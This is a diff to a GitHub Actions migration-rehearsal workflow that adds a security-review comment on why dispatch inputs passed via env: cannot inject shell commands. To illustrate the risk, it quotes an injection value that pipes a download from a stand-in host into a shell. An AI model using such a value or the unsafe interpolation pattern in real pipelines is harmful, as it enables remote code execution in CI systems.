@@ -4,6 +4,33 @@ name: Migration rehearsal
 # run before shipping a migration that touches a large/hot table, not a gate
 # every PR needs. See docs/guides/migrations.md's "Migration rehearsal"
 # section and apps/api/scripts/migration-rehearsal.sh.
+#
+# LOW-1 (2026-08 security review): `time_budget_seconds` and `seed_spec` below
+# are workflow_dispatch inputs that reach `run:` (via env:, see the two steps
+# that consume them) and one `if:` condition. Recorded safe today, and why:
+#
+#   - Trigger is workflow_dispatch only — no `pull_request`/`pull_request_target`,
+#     so only a collaborator with write access (dispatch permission) can supply
+#     these values at all. This is not attacker-controlled input.
+#   - Both inputs reach `run:` via `env:` (`REHEARSAL_TIME_BUDGET_SECONDS`,
+#     `SEED_SPEC_INPUT`), never spliced directly into the script text — the safe
+#     pattern (shell expands an env var's VALUE; it does not re-parse that value
+#     as shell syntax). Direct `${{ github.event.inputs.x }}` interpolation
+#     inside a `run:` block's shell text is the unsafe pattern this avoids: with
+#     env:, a value like `"; curl evil.sh | sh #"` is just an inert string in
+#     `$budget`/`$SEED_SPEC_INPUT`, not executed.
+#   - `time_budget_seconds` is additionally validated as `^[1-9][0-9]*$` before
+#     use (see the `budget` regex check) — belt-and-suspenders on top of the
+#     env: pattern already being safe.
+#   - The `if: ${{ github.event.inputs.seed_spec != '' }}` use is GitHub Actions
+#     *expression* context, not shell — there is no injection surface there
+#     regardless of the input's content.
+#
+# What would make this unsafe, so a future change re-triggers review: widening
+# the trigger to `pull_request`/`pull_request_target` (inputs become
+# attacker-controlled), or a future step that interpolates either input
+# directly into `run:` shell text (`${{ ... }}` inside the script body) instead
+# of via `env:`.
 on:
   workflow_dispatch:
     inputs:
